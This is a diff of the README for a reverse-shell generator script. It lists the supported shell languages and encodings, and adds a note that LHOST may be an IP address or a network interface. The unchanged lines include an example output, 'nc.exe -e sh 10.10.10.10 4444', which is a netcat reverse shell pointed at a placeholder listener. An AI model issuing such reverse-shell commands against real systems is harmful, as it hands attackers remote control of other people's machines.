@@ -21,7 +21,8 @@ Psutil
 **Available revshells:** bash, netcat, ncat, rustcat, perl, php, windows, powershell, python, ruby, socat, nodejs, telnet, zsh, lua, golang, awk.  
 **Available encodes**: base64(also accepts b64 as input), url  
 ### Useful info  
-- Get a list of all available reverse shells  
+**LHOST CAN BE AN IP OR AN INTERFACE(E.g. tun0 or 10.10.10.10)**
+- Get a list of all available reverse shells 
 ```bash
     python3 reverse.py -s listall
 ```  
@@ -46,4 +47,4 @@ This would return => **nc.exe -e sh 10.10.10.10 4444**
 ![If you see this text you are having trouble loading the gif :(](https://media.giphy.com/media/woqDTmU2pL2tc4eJ5c/giphy.gif)  
 
 As you might have noticed, I wrote bash=gurgui, that's because I changed the name of that exact bash rshell to gurgui in the script.  
-Having the script in ur path with custom names for shells you usually go for might make this super fast.  
+Having the script in ur path with custom names for shells you usually go for might make this super fast.
